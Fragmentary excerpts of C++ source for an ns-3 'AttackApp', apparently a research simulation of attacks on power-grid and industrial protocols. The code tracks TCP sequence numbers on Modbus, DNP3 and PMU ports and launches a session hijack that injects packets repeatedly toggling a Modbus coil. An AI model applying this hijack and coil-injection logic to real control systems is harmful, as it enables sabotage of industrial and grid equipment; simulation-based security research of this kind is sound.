...
void
AttackApp::SendPacketAlterCoilValue (modbusAlternateSwitchCoilParameters
		*parameters)
{
...
void
AttackApp::ScheduleTxAlterCoil (modbusAlternateSwitchCoilParameters *parameters)
{
  if (m_running)
    {
...
static vector<pair<uint16_t,uint16_t>> g_pmuPortRanges = {{5022,5036}};

static inline bool InRanges(uint16_t x, const vector<pair<uint16_t,uint16_t>> &rs) {
  for (auto &r:rs) if (x>=r.first && x<=r.second) return true;
  return false;
}

static inline bool IsPmuPort(uint16_t p) { return InRanges(p, g_pmuPortRanges); }

// this is used to dynamically change the port ranges as per the ns3.conf (current configuration does not use that)
/*
static void ParseRangeList(const string& s,vector<pair<uint16_t,uint16_t>> &out) {
  stringstream ss(s); 
  string tok;
  out.clear();
  while (getline(ss, tok,',')) {
    ...
    if (dash==string::npos) {
      ...
      uint16_t a=stoi(tok.substr(0,dash));
      uint16_t b=stoi(tok.substr(dash+1));
      out.push_back({a,b});
    }
  }
}
...
int AttackApp::readConfigFile( configuration * config)
{
	...
	ifstream infile("/etc/ns3/ns3.conf");
	string line="",linePrev="PMU";
	int readNewProtocol=0, indexNum=0;

	// if line starts with 'pmu_ports'
         if (line.rfind("pmu_ports", 0)==0) {  
        auto eq=line.find('=');
        if (eq!=string::npos)
        {
            string val=line.substr(eq + 1);
            ParseRangeList(val,g_pmuPortRanges);
            cout<<"Configured PMU port ranges: "<<val<<endl;
        }
    }
	   	    	...
	   	    	while (std::getline(infile, line))
	   	    	{
	   	    		...
	   	    		for(std::string s; iss >> s; )
	   	    		{
	   	    			...
	   	    			case 2:
	   	    				...
	   	    				(config->modbus.values_to_alter[indexNum]).integer_value =stol(s,nullptr,0);
	   	    				std::cout<<"type:"<<(int)(config->modbus.values_to_alter[indexNum]).type << "id:"<<(int)(config->modbus.values_to_alter[indexNum]).identifier <<"Val:"<<(config->modbus.values_to_alter[indexNum]).integer_value <<std::endl;
	   	    				if(config->modbus.values_to_alter[indexNum].type ==17)
	   	    				{
	   	    					//launch session hijack and continuously switch on and off coil of givn index with given period
	   	    					enableAlternatingCoilValuesMODBUS = true;
	   	    					indexOfCoil = config->modbus.values_to_alter[indexNum].identifier;
								periodOfCoilStateSwitch = (config->modbus.values_to_alter[indexNum]).integer_value;
...
else if(ipProtocol == 6 && (lengthOfData>0) && (tcpHdr1.GetDestinationPort()==20000 || tcpHdr1.GetSourcePort()==20000))
{
	...
	else if (tcpHdr1.GetSourcePort()==20000)
	{
		senderIp = ipV4Hdr.GetDestination();
				...
				nextSeqNo = (int32_t)tcpHdr1.GetAckNumber().GetValue();
				nextAck = (int32_t)tcpHdr1.GetSequenceNumber().GetValue()+tcpHdr1.GetLength();
	}
...
else if(ipProtocol == 6 && (lengthOfData>0) && (tcpHdr1.GetDestinationPort()==502 || tcpHdr1.GetSourcePort()==502))
{
	...
	else if (tcpHdr1.GetSourcePort()==502)
	{
		senderIp = ipV4Hdr.GetDestination();
				...
				nextSeqNo = (int32_t)tcpHdr1.GetAckNumber().GetValue();
				nextAck = (int32_t)tcpHdr1.GetSequenceNumber().GetValue()+tcpHdr1.GetLength();
				session->nextSeq =nextSeqNo;
				session->nextAck = nextAck;
	}
...
//			else
		     ...
		     if(enableAlternatingCoilValuesMODBUS &&  tcpHdr1.GetDestinationPort()==502)
		     {
		    	 enableAlternatingCoilValuesMODBUS = false;
		     ...
		     modbusAlternateSwitchCoilParameters *parameters =  new _modbusAlternateSwitchCoilParameters();
		     parameters->device=device;
		     parameters->from = from;
		     parameters->index = indexOfCoil;
		    parameters->ipV4Hdr = ipV4Hdr;
		    parameters->packetType = packetType;
		    parameters->period = periodOfCoilStateSwitch;
		    parameters->promisc = promiscuous;
		    parameters->protocol =  protocol;
		    parameters->state = true;
		    parameters->tcpHdr = tcpHdr;
		    parameters->tcpHdr.SetSequenceNumber(parameters->tcpHdr.GetSequenceNumber()+parameters->tcpHdr.GetLength());
		    parameters->to = to;
		    	 SendPacketAlterCoilValue ( parameters);
		     }
...
else if (ipProtocol == 6 && (lengthOfData > 0) &&
         (IsPmuPort(tcpHdr1.GetDestinationPort()) || IsPmuPort(tcpHdr1.GetSourcePort())))
{
	Ipv4Address senderIp;
	uint32_t senderIntIP;
	uint64_t key;
	...
	if (IsPmuPort(tcpHdr1.GetDestinationPort()))
	{
		senderIp = ipV4Hdr.GetSource();
		senderIntIP = senderIp.Get();
		key = (senderIntIP<<16) + tcpHdr1.GetSourcePort();
	...
	else if (IsPmuPort(tcpHdr1.GetSourcePort()))
	{
		senderIp = ipV4Hdr.GetDestination();
				senderIntIP = senderIp.Get();
				key = (senderIntIP<<16) + tcpHdr1.GetDestinationPort();
